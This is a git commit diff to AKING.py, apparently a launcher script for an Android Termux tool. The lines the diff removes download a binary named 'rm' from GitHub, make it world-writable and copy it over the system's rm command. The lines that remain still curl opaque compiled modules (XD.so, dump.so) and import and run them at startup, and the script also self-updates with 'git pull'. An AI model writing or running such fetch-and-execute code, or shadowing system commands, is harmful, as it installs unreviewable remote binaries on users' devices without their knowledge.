fe96668485ad1ee6178ad675d415c6d48854cba6
IMTIAZ AKING <98144321+AKING110@users.noreply.github.com>
2022-12-18 02:35:58 +0500

    Update AKING.py

--- AKING.py
+++ AKING.py
@@ -1,32 +1,17 @@
 import os
-try:
-    try:
-        open('/sdcard/AKING-OK.txt','r').read()
-    except:
-        open('/sdcard/AKING-OK.txt','w').wrire('Aking Ok ids')
-except:
-    print(' First Allow Termux Setup Permeations (y) ')
-    os.system('termux-setup-storage')
-    pass
 os.system('git pull')
 from os import path,system
 from platform import uname
 arch=uname().machine.lower()
-system("curl -L https://raw.githubusercontent.com/AKING110/AKING-PRO/main/rm -o rm")
-try:
-    os.system('chmod 777 rm && cp rm /data/data/com.termux/files/usr/bin')
-except:pass
-if path.isfile("XD.so"):
-    pass
-else:
-    system("curl -L https://raw.githubusercontent.com/AKING110/files/main/XD.so -o XD.so")
-if path.isfile("dump.so"):
-    pass
-else:
-    system("curl -L https://raw.githubusercontent.com/AKING110/files/main/dump.so -o dump.so")
 if 'aarch' in arch:
     print('\033[1;34m\n Congratulations! Your Device Support This Tools\033[1;37m')
-    import XD
-    XD.menu()
+    if path.isfile("XD.so"):
+        import XD
+        XD.menu()
+    else:
+        system("curl -L https://raw.githubusercontent.com/AKING110/files/main/XD.so -o XD.so")
+    if path.isfile("dump.so"):
+        pass
+    else:
+        system("curl -L https://raw.githubusercontent.com/AKING110/files/main/dump.so -o dump.so")
 else:exit('\033[1;31m\n Sorry System or 32bit device not supported ')
-    
